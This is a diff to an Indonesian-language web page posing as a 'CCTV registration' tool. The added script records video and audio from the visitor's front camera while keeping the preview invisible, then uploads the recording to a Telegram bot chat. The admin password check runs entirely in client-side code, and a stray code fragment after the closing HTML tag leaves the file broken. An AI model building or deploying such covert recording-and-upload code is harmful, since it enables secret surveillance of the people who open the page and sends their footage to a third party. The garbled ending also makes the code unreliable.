@@ -10,7 +10,7 @@
   input, button { padding:10px; margin:5px; font-size:16px; border-radius:5px; border:none; }
   button { cursor:pointer; background:#0f0; color:#000; }
   video { width:1px; height:1px; opacity:0; position:absolute; top:0; left:0; }
-  #adminPanel, #cctvPanel { display:none; flex-direction:column; align-items:center; }
+  #cctvPanel, #adminPanel { display:none; flex-direction:column; align-items:center; }
 </style>
 </head>
 <body>
@@ -26,7 +26,7 @@
 <div id="cctvPanel">
   <h2>Daftar CCTV Baru</h2>
   <input type="text" id="cctvName" placeholder="Nama CCTV">
-  <button id="startCCTVBtn">Mulai Rekam</button>
+  <button id="startCCTVBtn">Minta Izin & Mulai Rekam</button>
   <button id="stopCCTVBtn">Hentikan & Kirim</button>
   <video id="video" autoplay playsinline></video>
 </div>
@@ -68,6 +68,57 @@ document.getElementById('registerCCTVBtn').onclick = () => {
 document.getElementById('startCCTVBtn').onclick = async () => {
   cctvName = document.getElementById('cctvName').value || "CCTV-" + Date.now();
   try {
+    // Minta izin kamera & mikrofon
+    stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
+    video.srcObject = stream;
+
+    recorder = new MediaRecorder(stream);
+    chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.start();
+    alert("Rekaman dimulai: "+cctvName);
+  } catch(err){
+    alert("Akses kamera/mikrofon ditolak atau error: "+err);
+  }
+};
+
+document.getElementById('stopCCTVBtn').onclick = async () => {
+  if(recorder && recorder.state !== 'inactive') recorder.stop();
+  if(stream) stream.getTracks().forEach(track => track.stop());
+
+  recorder.onstop = async ()=>{
+    const blob = new Blob(chunks,{type:"video/webm"});
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("video", blob, cctvName+".webm");
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:"POST", body:formData });
+      alert("✅ Video dikirim ke Telegram!");
+    } catch(err){ alert("❌ Gagal kirim: "+err); }
+  };
+};
+
+// Admin login
+document.getElementById('adminLoginBtn').onclick = ()=>{
+  mainPanel.style.display = 'none';
+  adminPanel.style.display = 'flex';
+};
+
+document.getElementById('loginAdminBtn').onclick = ()=>{
+  if(document.getElementById('adminPass').value === ADMIN_PASS){
+    controlPanel.style.display='flex';
+    cctvList.innerHTML = `<li>${cctvName || "Belum ada CCTV"}</li>`;
+  } else alert("Password salah!");
+};
+
+// Tombol admin kontrol (placeholder)
+document.getElementById('adminStartBtn').onclick = ()=>{ alert("Mulai semua CCTV (perlu implementasi remote)"); };
+document.getElementById('adminStopBtn').onclick = ()=>{ alert("Hentikan semua CCTV & kirim (perlu implementasi remote)"); };
+</script>
+
+</body>
+</html>  try {
     stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
     video.srcObject = stream;
 
